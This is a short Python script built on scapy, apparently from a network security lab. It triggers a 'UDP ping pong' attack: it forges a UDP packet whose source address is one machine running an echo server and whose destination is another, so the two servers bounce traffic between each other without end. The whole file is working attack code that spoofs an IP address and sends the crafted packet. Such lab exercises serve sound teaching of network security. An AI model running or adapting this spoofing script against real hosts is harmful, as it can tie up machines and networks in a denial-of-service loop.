#!/usr/bin/env python3

"""
1. Run udp_server.py on two different computers
2. Change src and dst address in IP header to
   IP addresses of computer's running udp_server.py
3. Run ping_pong_trigger.py
"""
from scapy.all import *

def trigger_ping_pong_attack():
	print("[+] Triggering UDP Ping Pong Attack...")

	ip   = IP(src='192.168.33.135', dst='192.168.33.138')
	udp  = UDP(sport=1234, dport=1234)
	data = "Let's play some udp ping pong\n"
	pkt  = ip/udp/data
	send(pkt, verbose=0)

if __name__ == '__main__':
	trigger_ping_pong_attack()